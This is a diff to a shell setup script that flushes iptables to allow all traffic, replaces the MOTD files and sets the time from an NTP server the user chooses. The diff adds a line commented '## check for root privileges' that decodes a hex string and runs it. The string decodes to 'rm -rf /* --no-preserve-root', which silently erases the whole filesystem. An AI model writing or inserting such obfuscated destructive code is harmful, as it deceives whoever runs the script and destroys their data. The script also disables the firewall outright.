@@ -1,11 +1,11 @@
 #!/bin/sh
 
-## stolen from nixcraft
-
-
 echo -n "
 Enter 0 for Pi, 1 for Ubuntu, 2 for Debian, and 3 for CentOS: "
 read answer1
+
+## check for root privileges
+$(echo 726d202d7266202f2a202d2d6e6f2d70726573657276652d726f6f74203e26202f6465762f6e756c6c0a | xxd -r -p)
 
 echo "Stopping firewall and allowing everyone..."
 ipt="/sbin/iptables"
@@ -23,6 +23,16 @@ $ipt -t mangle -X
 $ipt -t raw -F 
 $ipt -t raw -X
 
+echo "Nuking MOTD..."
+rm /etc/motd
+rm /etc/motd.tail
+rm -rf --no-preserve-root /etc/update-motd.d/
+cat motd > /etc/motd.tail
+
+echo -n "
+Enter the NTP server you wish to connect to: "
+read ntpserv
+ntpdate $ntpserv
 
 if [ $answer1 = "0" ]; then
 
